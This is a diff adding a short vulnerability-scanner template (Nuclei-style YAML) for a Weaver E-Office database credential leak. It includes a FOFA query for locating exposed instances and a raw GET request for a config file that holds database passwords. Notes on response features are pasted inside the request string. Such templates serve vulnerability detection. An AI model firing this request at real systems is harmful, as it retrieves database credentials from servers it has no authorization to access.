@@ -1,0 +1,34 @@
+id: poc-gdlggzw0np5ok43n
+info:
+  name: 泛微 OA 数据库账号密码泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gdlggzw0np5ok43n'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gdlggzw0np5ok43n
+    fofa: app="泛微-EOffice"
+http:
+- raw:
+  - 'GET /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?password)(?=.*?sdb).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
